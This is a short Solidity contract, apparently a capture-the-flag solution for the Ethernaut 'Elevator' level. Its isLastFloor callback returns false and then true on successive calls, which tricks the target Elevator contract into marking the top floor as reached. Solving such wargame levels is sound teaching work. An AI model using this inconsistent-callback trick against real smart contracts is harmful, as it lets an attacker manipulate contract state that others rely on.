// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./elevator.sol";

contract ElevatorHacker is Building {
    bool _isLastFloor;
    Elevator elevator;
    constructor(address _elevator) public {
        elevator = Elevator(_elevator);
    }

    function attack() public {
        _isLastFloor = false;
        elevator.goTo(1);
    }

    function isLastFloor(uint) override public returns (bool) {
        bool tmp = _isLastFloor;
        _isLastFloor = !_isLastFloor;
        return tmp;
    }
}